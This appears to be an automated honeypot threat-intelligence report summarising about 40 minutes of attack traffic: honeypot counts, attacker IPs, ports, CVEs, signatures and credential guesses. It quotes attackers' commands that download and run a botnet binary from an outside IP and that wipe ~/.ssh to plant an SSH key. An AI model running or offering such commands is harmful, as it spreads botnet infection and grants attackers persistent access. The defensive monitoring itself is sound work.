Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-13T05:01:41Z
**Timeframe:** 2025-10-13T04:20:02Z to 2025-10-13T05:00:01Z
**Files Used:**
- agg_log_20251013T042002Z.json
- agg_log_20251013T044001Z.json
- agg_log_20251013T050001Z.json

### Executive Summary
This report summarizes 13,941 events collected from the T-Pot honeypot network over a period of approximately 40 minutes. The majority of attacks were captured by the Dionaea, Cowrie, and Ciscoasa honeypots. The most targeted service was SMB (port 445), indicating widespread scanning for vulnerabilities like EternalBlue. The top attacking IP, 103.184.72.162, was responsible for over 25% of all recorded events. A number of CVEs were detected, and attackers were observed attempting to add their SSH keys to `authorized_keys` for persistent access, as well as downloading botnet-related payloads.

### Detailed Analysis

**Attacks by Honeypot:**
- Dionaea: 5015
- Cowrie: 3821
- Ciscoasa: 1836
- Suricata: 1151
- Mailoney: 802
- Sentrypeer: 751
- H0neytr4p: 212
- Honeytrap: 167
- Tanner: 106
- ConPot: 32
- ElasticPot: 11
- Honeyaml: 13
- Redishoneypot: 9
- Miniprint: 7
- Adbhoney: 3
- Heralding: 3
- Ipphoney: 2

**Top Attacking IPs:**
- 103.184.72.162: 3570
- 203.78.147.68: 1473
- 103.160.232.131: 917
- 86.54.42.238: 776
- 62.141.43.183: 324
- 172.86.95.98: 277
- 196.29.34.170: 248
- 74.94.234.151: 209
- 186.124.138.154: 198
- 103.176.78.151: 163
- 103.97.177.230: 102
- 128.14.236.214: 100
- 43.204.54.62: 65
- 45.119.81.249: 120
- 185.243.5.146: 76
- 167.250.224.25: 50
- 114.200.93.107: 45
- 62.60.131.157: 48

**Top Targeted Ports/Protocols:**
- 445: 4490
- 25: 803
- 5060: 751
- 22: 673
- 443: 212
- 80: 110
- TCP/21: 140
- TCP/22: 77
- 21: 70
- 23: 42

**Most Common CVEs:**
- CVE-2021-3449
- CVE-2019-11500
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2020-11910

**Commands Attempted by Attackers:**
- Reconnaissance commands such as `uname -a`, `whoami`, `lscpu`, `cat /proc/cpuinfo`, `free -m`, `w`, and `crontab -l` were frequently used.
- Attempts to modify SSH authorized keys were common: `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- File download and execution commands: `busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN NMAP -sS window 1024
- 2009582
- ET FTP FTP PWD command attempt without login
- 2010735
- ET FTP FTP CWD command attempt without login
- 2010731
- ET SCAN Potential SSH Scan
- 2001219

**Users / Login Attempts:**
A wide variety of usernames and passwords were attempted, with a focus on default credentials for root and admin accounts. Some of the most common attempts include:
- root/444
- 345gs5662d34/345gs5662d34
- www/www
- root/Soporteti
- root/3245gs5662d34
- logout/logout
- ubnt/0000
- root/admin1
- nobody/5555555555

**Files Uploaded/Downloaded:**
- Mozi.a+varcron
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

**HTTP User-Agents:**
- No HTTP user-agents were recorded in this period.

**SSH Clients and Servers:**
- No specific SSH clients or servers were identified in the logs.

**Top Attacker AS Organizations:**
- No attacker AS organizations were identified in the logs.

### Key Observations and Anomalies
- The high volume of traffic to port 445 suggests automated scanning for SMB vulnerabilities on a large scale.
- Attackers are actively trying to gain persistent access by adding their SSH public keys to the `authorized_keys` file. The `mdrfckr` comment in the SSH key is a notable taunt.
- The downloaded files (`*.urbotnetisass`) are indicative of a botnet campaign targeting multiple CPU architectures (ARM, x86, MIPS). This suggests an attempt to build a botnet from compromised IoT devices and servers.
- The Suricata signatures consistently flag IPs listed on the Dshield blocklist, indicating that many of the attackers are known malicious actors.
- The variety of honeypots that are being triggered shows a broad spectrum of scanning and exploitation techniques being used by attackers.
